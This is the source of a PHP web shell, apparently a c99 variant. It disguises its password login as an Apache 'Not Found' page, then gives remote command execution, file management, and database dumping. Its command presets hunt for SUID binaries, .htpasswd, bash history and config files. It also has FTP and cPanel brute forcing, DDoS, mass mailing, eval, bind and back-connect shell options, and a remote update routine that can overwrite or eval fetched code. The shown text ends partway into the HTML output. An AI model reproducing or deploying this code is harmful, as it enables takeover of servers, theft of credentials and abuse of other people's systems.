<?php
$md5_pass = "33131485c55aca71f3f0db2c6a200470";

//login page
@session_start();function printLogin() {
echo '<html><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache Server at Port 80</address><style>input { margin:10;background-color:#fff;border:1px solid #fff; }</style><form method=post><input type=password name=pass></form></body><html>';
exit; } if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) if( empty( $md5_pass ) ||( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $md5_pass ) ) )
$_SESSION[md5($_SERVER['HTTP_HOST'])] = true; else	printLogin();	


///shell asli
if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
$win = strtolower(substr(PHP_OS,0,3)) == "win";
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) 
{
	if (!function_exists("strips")) 
	{
		function strips(&$arr,$k="") 
		{
			if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} 
			else {$arr = stripslashes($arr);}
		}
	} 
	strips($GLOBALS);
}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}

$shver = "The"; 
if (!empty($unset_surl)) {setcookie("c99sh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c99sh_surl",$surl);}
else {$surl = $_REQUEST["c99sh_surl"];}

$surl_autofill_include = TRUE; 

if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) 
{
	$include = "&"; 
	foreach (explode("&",getenv("QUERY_STRING")) as $v) 
	{
		$v = explode("=",$v); 
		$name = urldecode($v[0]); 
		$value = urldecode($v[1]); 
		foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) 
		{
			if (strpos($value,$needle) === 0) 
			{
				$includestr .= urlencode($name)."=".urlencode($value)."&";
			}
		}
	}
	if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}
}
if (empty($surl))
{
	$surl = "?".$includestr; 
}
$surl = htmlspecialchars($surl); 

$host_allow = array("*");
$login_txt = "Restricted area"; 
$accessdeniedmess = $shver."</a>: access denied";
$gzipencode = TRUE; 
$updatenow = FALSE;
$c99sh_updateurl = "";
$c99sh_sourcesurl = "";
$filestealth = TRUE;
$donated_html = '<center><script language="javascript">$isij=document.write(window.location);</script></center>';
$donated_act = array("",
"gofile","ls","f","sql","mkdir","ftpquickbrute","d","phpinfo","security","mkfile",
"encoder","fsbuff","selfremove","update","feedback","search","chmod","upload",
"delete","paste","copy","cut","unselect","cmd","processes","tools","eval","jumping","scanconfig","check","crack","DDos","fuzz","mail","about"
);  
$curdir = "./";  
$tmpdir = "";
$tmpdir_log = "./"; 
$log_email = "";
$sort_default = "0a";
$sort_save = TRUE;
$ftypes  = array(
	"html"=>array("html","htm","shtml"),
	"txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
	"exe"=>array("sh","install","bat","cmd"),
	"ini"=>array("ini","inf"),
	"code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
	"img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
	"sdb"=>array("sdb"),
	"phpsess"=>array("sess"),
	"download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
 
$exeftypes  = array(
	getenv("PHPRC")." -q %f%" => array("php","php3","php4"),
	"perl %f%" => array("pl","cgi")
); 
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"<font color=\"yellow\">","</font>"), 
  array("config.php",1) 
);
$safemode_diskettes = array("a");  
$hexdump_lines = 8; 
$hexdump_rows = 24; 
$nixpwdperpage = 100; 
$bindport_pass = "c99"; 
$bindport_port = "31373"; 
$bc_port = "31373"; 
$datapipe_localport = "8081";  
if (!$win)
{
	$cmdaliases = array(
		array("------------ ls -la ------------------", "ls -la"),
		array("find all suid files", "find / -type f -perm -04000 -ls"),
		array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
		array("find all sgid files", "find / -type f -perm -02000 -ls"),
		array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
		array("find config.inc.php files", "find / -type f -name config.inc.php"),
		array("find config* files", "find / -type f -name \"config*\""),
		array("find config* files in current dir", "find . -type f -name \"config*\""),
		array("find all writable folders and files", "find / -perm -2 -ls"),
		array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
		array("find all service.pwd files", "find / -type f -name service.pwd"),
		array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
		array("find all .htpasswd files", "find / -type f -name .htpasswd"),
		array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
		array("find all .bash_history files", "find / -type f -name .bash_history"),
		array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
		array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
		array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
		array("list file attributes on a Linux second extended file system", "lsattr -va"),
		array("show opened ports", "netstat -an | grep -i listen")
	);
}
else
{
	$cmdaliases = array(
  array("----------- dir -------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}
$sess_cookie = "c99shvars";
$usefsbuff = TRUE;
$copy_unset = FALSE;
$quicklaunch = array(
	array("Home",$surl),
	array("<==","#\" onclick=\"history.back(1)"),
	array("==>","#\" onclick=\"history.go(1)"),
	array("Up",$surl."act=ls&d=%upd&sort=%sort"), 
	array("Search",$surl."act=search&d=%d"),
	array("Buffer",$surl."act=fsbuff&d=%d"),
	array("Encoder",$surl."act=encoder&d=%d"),
	array("Tools",$surl."act=tools&d=%d"),
	array("Process",$surl."act=processes&d=%d"),
	array("FTP brute",$surl."act=ftpquickbrute&d=%d"),
	array("Security",$surl."act=security&d=%d"),
	array("SQL",$surl."act=sql&d=%d"),
	array("Checker",$surl."act=check&d=%d"),
	array("Crack Cpanel+ftp",$surl."act=crack&d=%d"),
	array("J",$surl."act=scanconfig&d=%d"),
	array("SC",$surl."act=jumping&d=%d"),
	array("DDos",$surl."act=DDos&d=%d"),
	array("Fuzzer",$surl."act=fuzz&d=%d"),
	array("Mass Mail",$surl."act=mail&d=%d"),
	array("PHP-code",$surl."act=eval&d=%d"),
	array("F-back",$surl."act=feedback&d=%d"),
	array("Me",$surl."act=abaut&d=%d"),
	array("logout",$surl."act=logout&d=%d")
); 
$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";
@$f = $_REQUEST["f"];
@extract($_REQUEST["c99shcook"]);

if ($act != "img")
{
	$lastdir = realpath(".");
	chdir($curdir);
	if ($selfwrite or $updatenow) {@ob_clean(); c99sh_getupdate($selfwrite,1); exit;}
	$sess_data = unserialize($_COOKIE["$sess_cookie"]);
	if (!is_array($sess_data)) {$sess_data = array();}
	if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
	if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}
	$disablefunc = @ini_get("disable_functions");
	if (!empty($disablefunc))
	{
		$disablefunc = str_replace(" ","",$disablefunc);
		$disablefunc = explode(", ",$disablefunc);
	}
	if (!function_exists("c99_buff_prepare"))
	{
		function c99_buff_prepare()
		{
			global $sess_data;
			global $act;
			foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
			foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
			$sess_data["copy"] = array_unique($sess_data["copy"]);
			$sess_data["cut"] = array_unique($sess_data["cut"]);
			sort($sess_data["copy"]);
			sort($sess_data["cut"]);
			if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
			else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
		}
	}
	c99_buff_prepare();
	if (!function_exists("c99_sess_put"))
	{
		function c99_sess_put($data)
		{
			global $sess_cookie;
			global $sess_data;
			c99_buff_prepare();
			$sess_data = $data;
			$data = serialize($data);
			setcookie($sess_cookie,$data);
		}
	}
	foreach (array("sort","sql_sort") as $v)
	{
		if (!empty($_GET[$v])) {$$v = $_GET[$v];}
		if (!empty($_POST[$v])) {$$v = $_POST[$v];}
	}
	if ($sort_save)
	{
		if (!empty($sort)) {setcookie("sort",$sort);}
		if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
	}
	if (!function_exists("str2mini"))
	{
		function str2mini($content,$len)
		{
			if (strlen($content) > $len)
			{
				$len = ceil($len/2) - 2;
				return substr($content, 0,$len)."...".substr($content,-$len);
			}
			else {return $content;}
		}
	}
	if (!function_exists("view_size"))
	{
		function view_size($size)
		{
			if (!is_numeric($size)) {return FALSE;}
			else
			{
				if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
				elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
				elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
				else {$size = $size . " B";}
				return $size;
			}
		}
	}
	if (!function_exists("fs_copy_dir"))
	{
		function fs_copy_dir($d,$t)
		{
			$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
			if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
			$h = opendir($d);
			while (($o = readdir($h)) !== FALSE)
			{
			  if (($o != ".") and ($o != ".."))
			  {
				  if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
				  else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
				  if (!$ret) {return $ret;}
			  }
			}
			closedir($h);
			return TRUE;
		}
	}
	if (!function_exists("fs_copy_obj"))
	{
		function fs_copy_obj($d,$t)
		{
			$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
			$t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
			if (!is_dir(dirname($t))) {mkdir(dirname($t));}
			if (is_dir($d))
			{
				if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
				if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
				return fs_copy_dir($d,$t);
			}
			elseif (is_file($d)) {return copy($d,$t);}
			else {return FALSE;}
		}
	}
	if (!function_exists("fs_move_dir"))
	{
		function fs_move_dir($d,$t)
		{
			$h = opendir($d);
			if (!is_dir($t)) {mkdir($t);}
			while (($o = readdir($h)) !== FALSE)
			{
				if (($o != ".") and ($o != ".."))
				{
				  $ret = TRUE;
				  if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
				  else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
				  if (!$ret) {return $ret;}
				}
			}
			closedir($h);
			return TRUE;
		}
	}
	if (!function_exists("fs_move_obj"))
	{
		function fs_move_obj($d,$t)
		{
			$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
			$t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
			if (is_dir($d))
			{
				if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
				if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
				return fs_move_dir($d,$t);
			}
			elseif (is_file($d))
			{
				if(copy($d,$t)) {return unlink($d);}
				else {unlink($t); return FALSE;}
			}
			else {return FALSE;}
		}
	}
	if (!function_exists("fs_rmdir"))
	{
		function fs_rmdir($d)
		{
			$h = opendir($d);
			while (($o = readdir($h)) !== FALSE)
			{
				if (($o != ".") and ($o != ".."))
				{
					if (!is_dir($d.$o)) {unlink($d.$o);}
					else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
				}
			}
			closedir($h);
			rmdir($d);
			return !is_dir($d);
		}
	}
	if (!function_exists("fs_rmobj"))
	{
		function fs_rmobj($o)
		{
			$o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
			if (is_dir($o))
			{
				if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
				return fs_rmdir($o);
			}
			elseif (is_file($o)) {return unlink($o);}
			else {return FALSE;}
		}
	}
	if (!function_exists("myshellexec"))
	{
		function myshellexec($cmd)
		{
			global $disablefunc;
			$result = "";
			if (!empty($cmd))
			{
				if (is_callable("exec") and !in_array("exec",$disablefunc)) 
				{
					exec($cmd,$result); $result = join("\n",$result);
				}
				elseif (($result = `$cmd`) !== FALSE) {}
				elseif (is_callable("system") and !in_array("system",$disablefunc)) 
				{
					$v = @ob_get_contents(); 
					@ob_clean(); system($cmd); 
					$result = @ob_get_contents(); 
					@ob_clean(); 
					echo $v;
				}
				elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) 
				{
					$v = @ob_get_contents(); 
					@ob_clean(); 
					passthru($cmd); 
					$result = @ob_get_contents(); 
					@ob_clean(); 
					echo $v;
				}
				elseif (is_resource($fp = popen($cmd,"r")))
				{
					$result = "";
					while(!feof($fp)) {$result .= fread($fp,1024);}
					pclose($fp);
				}
			}
		 return $result;
		}
	}
	if (!function_exists("tabsort")) 
	{
		function tabsort($a,$b) 
		{
			global $v; return strnatcmp($a[$v], $b[$v]);
		}
	}
	if (!function_exists("view_perms"))
	{
		function view_perms($mode)
		{
			if (($mode & 0xC000) === 0xC000) {$type = "s";}
			elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
			elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
			elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
			elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
			elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
			elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
			else {$type = "?";}

			$owner["read"] = ($mode & 00400)?"r":"-";
			$owner["write"] = ($mode & 00200)?"w":"-";
			$owner["execute"] = ($mode & 00100)?"x":"-";
			$group["read"] = ($mode & 00040)?"r":"-";
			$group["write"] = ($mode & 00020)?"w":"-";
			$group["execute"] = ($mode & 00010)?"x":"-";
			$world["read"] = ($mode & 00004)?"r":"-";
			$world["write"] = ($mode & 00002)? "w":"-";
			$world["execute"] = ($mode & 00001)?"x":"-";

			if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
			if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
			if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}

			return $type.join("",$owner).join("",$group).join("",$world);
		}
	}
	if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) 
		{function posix_getpwuid($uid) {return FALSE;}}
	if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) 
		{function posix_getgrgid($gid) {return FALSE;}}
	if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) 
		{function posix_kill($gid) {return FALSE;}}
	if (!function_exists("parse_perms"))
	{
		function parse_perms($mode)
		{
			if (($mode & 0xC000) === 0xC000) {$t = "s";}
			elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
			elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
			elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
			elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
			elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
			elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
			else {$t = "?";}
			$o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
			$g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
			$w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
			return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
		}
	}
	if (!function_exists("parsesort"))
	{
		function parsesort($sort)
		{
			$one = intval($sort);
			$second = substr($sort,-1);
			if ($second != "d") {$second = "a";}
			return array($one,$second);
		}
	}
	if (!function_exists("view_perms_color"))
	{
		function view_perms_color($o)
		{
			if (!is_readable($o)) {return "<font color=#ff0000>".view_perms(fileperms($o))."</font>";}
			elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}
			else {return "<font color=#00ff00>".view_perms(fileperms($o))."</font>";}
		}
	}
	if (!function_exists("c99getsource"))
	{
		function c99getsource($fn)
		{
			global $c99sh_sourcesurl;
			$array = array(
				"c99sh_bindport.pl" => "c99sh_bindport_pl.txt",
				"c99sh_bindport.c" => "c99sh_bindport_c.txt",
				"c99sh_backconn.pl" => "c99sh_backconn_pl.txt",
				"c99sh_backconn.c" => "c99sh_backconn_c.txt",
				"c99sh_datapipe.pl" => "c99sh_datapipe_pl.txt",
				"c99sh_datapipe.c" => "c99sh_datapipe_c.txt",
				);
			$name = $array[$fn];
			if ($name) {return file_get_contents($c99sh_sourcesurl.$name);}
			else {return FALSE;}
		}
	}
	if (!function_exists("c99sh_getupdate"))
	{
		function c99sh_getupdate($update = TRUE)
		{
			$url = $GLOBALS["c99sh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
			$data = @file_get_contents($url);
			if (!$data) {return "Can't connect to update-server!";}
			else
			{
				$data = ltrim($data);
				$string = substr($data,3,ord($data{2}));
				if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return FALSE;}
				if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
				if ($data{0} == "\x99" and $data{1} == "\x03")
				{
					$string = explode("\x01",$string);
				  if ($update)
				  {
					  $confvars = array();
					  $sourceurl = $string[0];
					  $source = file_get_contents($sourceurl);
					  if (!$source) {return "Can't fetch update!";}
					  else
					  {
					    $fp = fopen(__FILE__,"w");
					    if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c99shell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
					    else {fwrite($fp,$source); fclose($fp); return "Thanks! Updated with success.";}
					  }
				  }
				  else {return "New version are available: ".$string[1];}
				  }
				  elseif ($data{0} == "\x99" and $data{1} == "\x04") {eval($string); return 1;}
				  else {return "Error in protocol: segmentation failed! (".$data.") ";}
			 }
		}
	}
	if (!function_exists("mysql_dump"))
	{
		function mysql_dump($set)
		{
			global $shver;
			$sock = $set["sock"];
			$db = $set["db"];
			$print = $set["print"];
			$nl2br = $set["nl2br"];
			$file = $set["file"];
			$add_drop = $set["add_drop"];
			$tabs = $set["tabs"];
			$onlytabs = $set["onlytabs"];
			$ret = array();
			$ret["err"] = array();
			if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
			if (empty($db)) {$db = "db";}
			if (empty($print)) {$print = 0;}
			if (empty($nl2br)) {$nl2br = 0;}
			if (empty($add_drop)) {$add_drop = TRUE;}
			if (empty($file))
			{
				$file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
			}
			if (!is_array($tabs)) {$tabs = array();}
			if (empty($add_drop)) {$add_drop = TRUE;}
			if (sizeof($tabs) == 0)
			{
				// retrive tables-list
				$res = mysql_query("SHOW TABLES FROM ".$db, $sock);
				if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
			}
			$out = "# Dumped by C99Shell.SQL v. ".$shver."
			# Home page: http://ccteam.ru
			#
			# Host settings:
			# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
			# Date: ".date("d.m.Y H:i:s")."
			# DB: \"".$db."\"
			#---------------------------------------------------------
			";
			$c = count($onlytabs);
			foreach($tabs as $tab)
			{
				if ((in_array($tab,$onlytabs)) or (!$c))
				{
					if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";} 
					$res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
					if (!$res) {$ret["err"][] = mysql_smarterror();}
					else
					{
						$row = mysql_fetch_row($res);
						$out .= $row["1"].";\n\n"; 
						$res = mysql_query("SELECT * FROM `$tab`", $sock);
						if (mysql_num_rows($res) > 0)
						{
							while ($row = mysql_fetch_assoc($res))
							{
								$keys = implode("`, `", array_keys($row));
								$values = array_values($row);
								foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
								$values = implode("', '", $values);
								$sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
								$out .= $sql;
							}
						}
					}
				}
			}
			$out .= "#---------------------------------------------------------------------------------\n\n";
			if ($file)
			{
				$fp = fopen($file, "w");
				if (!$fp) {$ret["err"][] = 2;}
				else
				{
					fwrite ($fp, $out);
					fclose ($fp);
				}
			}
			if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
			return $out;
		}
	}
	if (!function_exists("mysql_buildwhere"))
	{
		function mysql_buildwhere($array,$sep=" and",$functs=array())
		{
			if (!is_array($array)) {$array = array();}
			$result = "";
			foreach($array as $k=>$v)
			{
				$value = "";
				if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
				$value .= "'".addslashes($v)."'";
				if (!empty($functs[$k])) {$value .= ")";}
				$result .= "`".$k."` = ".$value.$sep;
			}
			$result = substr($result,0,strlen($result)-strlen($sep));
			return $result;
		}
	}
	if (!function_exists("mysql_fetch_all"))
	{
		function mysql_fetch_all($query,$sock)
		{
			if ($sock) {$result = mysql_query($query,$sock);}
			else {$result = mysql_query($query);}
			$array = array();
			while ($row = mysql_fetch_array($result)) {$array[] = $row;}
			mysql_free_result($result);
			return $array;
		}
	}
	if (!function_exists("mysql_smarterror"))
	{
		function mysql_smarterror($type,$sock)
		{
			if ($sock) {$error = mysql_error($sock);}
			else {$error = mysql_error();}
			$error = htmlspecialchars($error);
			return $error;
		}
	}
	if (!function_exists("mysql_query_form"))
	{
		function mysql_query_form()
		{
			global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
			if (($submit) and (!$sql_query_result) and ($sql_confirm)) 
			{
				if (!$sql_query_error) {$sql_query_error = "Query was empty";} 
				echo "<b>Error:</b> <br>".$sql_query_error."<br>";
			}
			if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
			if ((!$submit) or ($sql_act))
			{
			  echo "<table border=0><tr><td><form name=\"c99sh_sqlquery\" method=POST> <b>"; 
				if (($sql_query) and (!$submit)) {echo "Do you really want to";} 
				else {echo "SQL-Query";} 
				echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea>
				<br><br><input type=hidden name=act value=sql>
				<input type=hidden name=sql_act value=query>
				<input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\">
				<input type=hidden name=submit value=\"1\">
				<input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\">
				<input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
			  if ($tbl_struct)
			  {
				  echo "<td valign=\"top\"><b>Fields:</b><br>";
				  foreach ($tbl_struct as $field) 
					{
						$name = $field["Field"]; 
						echo "? <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";
					}
				  echo "</td></tr></table>";
				}
			}
			if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
		}
	}
	if (!function_exists("mysql_create_db"))
	{
		function mysql_create_db($db,$sock="")
		{
			$sql = "CREATE DATABASE `".addslashes($db)."`;";
			if ($sock) {return mysql_query($sql,$sock);}
			else {return mysql_query($sql);}
		}
	}
	if (!function_exists("mysql_query_parse"))
	{
		function mysql_query_parse($query)
		{
			$query = trim($query);
			$arr = explode (" ",$query);
			/*array array()
			{
			"METHOD"=>array(output_type),
			"METHOD1"...
			...
			}
			if output_type == 0, no output,
			if output_type == 1, no output if no error
			if output_type == 2, output without control-buttons
			if output_type == 3, output with control-buttons
			*/
			$types = array(
				"SELECT"=>array(3,1),
				"SHOW"=>array(2,1),
				"DELETE"=>array(1),
				"DROP"=>array(1)
				);
			$result = array();
			$op = strtoupper($arr[0]);
			if (is_array($types[$op]))
			{
				$result["propertions"] = $types[$op];
				$result["query"]  = $query;
				if ($types[$op] == 2)
			  {
					foreach($arr as $k=>$v)
					{
						if (strtoupper($v) == "LIMIT")
				    {
							$result["limit"] = $arr[$k+1];
							$result["limit"] = explode(",",$result["limit"]);
							if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
							unset($arr[$k],$arr[$k+1]);
				    }
					}
			  }
			}
			else {return FALSE;}
		}
	}
	if (!function_exists("c99fsearch"))
	{
		function c99fsearch($d)
		{
			global $found;
			global $found_d;
			global $found_f;
			global $search_i_f;
			global $search_i_d;
			global $a;
			if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
			$h = opendir($d);
			while (($f = readdir($h)) !== FALSE)
			{
				if($f != "." && $f != "..")
				{
					$bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
					if (is_dir($d.$f))
					{
						$search_i_d++;
						if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
						if (!is_link($d.$f)) {c99fsearch($d.$f);}
					}
					else
					{
						$search_i_f++;
						if ($bool)
						{
							if (!empty($a["text"]))
							{
								$r = @file_get_contents($d.$f);
								if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
								if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
								if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
								else {$bool = strpos(" ".$r,$a["text"],1);}
								if ($a["text_not"]) {$bool = !$bool;}
								if ($bool) {$found[] = $d.$f; $found_f++;}
							}
							else {$found[] = $d.$f; $found_f++;}
						}
					}
				}
			}
			closedir($h);
		}
	}
	if ($act == "gofile") 
	{
		if (is_dir($f)) 
		{
			$act = "ls"; $d = $f;
		}
		else {$act = "f"; $d = dirname($f); $f = basename($f);}
	}
	//Sending headers
	@ob_start();
	@ob_implicit_flush(0);
	function onphpshutdown()
	{
		global $gzipencode,$ft;
		if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad")))
		{
			$v = @ob_get_contents();
			@ob_end_clean();
			@ob_start("ob_gzHandler");
			echo $v;
			@ob_end_flush();
		}
	}
	function c99shexit()
	{
		onphpshutdown();
		exit;
	}
	header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
	header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0", FALSE);
	header("Pragma: no-cache");
	if (empty($tmpdir))
	{
		$tmpdir = ini_get("upload_tmp_dir");
		if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
	}
	$tmpdir = realpath($tmpdir);
	$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
	if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
	if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
	else {$tmpdir_logs = realpath($tmpdir_logs);}
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
	{
		$safemode = TRUE;
		$hsafemode = "<font color=#ff0000>ON (secure)</font>";
	}
	else {$safemode = FALSE; $hsafemode = "<font color=#00FF00>OFF (not secure)</font>";}
	$v = @ini_get("open_basedir");
	if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=#ff0000>".$v."</font>";}
	else {$openbasedir = FALSE; $hopenbasedir = "<font color=#00ff00>OFF (not secure)</font>";}
	$sort = htmlspecialchars($sort);
	if (empty($sort)) {$sort = $sort_default;}
	$sort[1] = strtolower($sort[1]);
	$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
	if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
	$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
	@ini_set("highlight.bg",$highlight_bg); //FFFFFF
	@ini_set("highlight.comment",$highlight_comment); //#FF8000
	@ini_set("highlight.default",$highlight_default); //#0000BB
	@ini_set("highlight.html",$highlight_html); //#000000
	@ini_set("highlight.keyword",$highlight_keyword); //#007700
	@ini_set("highlight.string",$highlight_string); //#DD0000
	if (!is_array($actbox)) {$actbox = array();}
	$dspact = $act = htmlspecialchars($act);
	$disp_fullpath = $ls_arr = $notls = null;
	$ud = urlencode($d);
	?>

	<html><head>
